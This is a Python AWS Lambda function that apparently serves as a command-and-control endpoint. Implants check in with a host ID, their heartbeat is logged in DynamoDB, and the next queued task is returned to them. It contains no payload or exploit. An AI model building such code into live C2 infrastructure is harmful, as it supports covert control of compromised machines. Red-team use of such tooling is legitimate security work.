import boto3
import os

client = boto3.client('dynamodb')

def lambda_handler(event, context):
  HostsDB = os.environ['HostsDatabase']
  contextLoaded = event['requestContext']
  requestTime = str(contextLoaded['requestTimeEpoch'])
  parameters = event['queryStringParameters']

  #get tasklist
  query = client.get_item(
    ProjectionExpression="taskList",
    TableName= HostsDB,
    Key={
        'hostid': {"S": parameters['hostid'] }
    }
  )
  updateHeartbeat = client.update_item(
    TableName= HostsDB,
    Key={
      'hostid': {"S": parameters['hostid']}
    },
    UpdateExpression="set heartbeat=:c",
    ExpressionAttributeValues={
        ':c': {"S": requestTime}
    }
  )
  #if task assigned send to implant
  try: 
    queryParse = query['Item']['taskList']['L'][0]['S']
    
    response = {
        'statusCode': 200,
        'body': str(queryParse),
        'headers': {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        },
    }
    
    return response
  except:
    response = {
        'statusCode': 200,
        'body': "",
        'headers': {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        },
    }
    return response
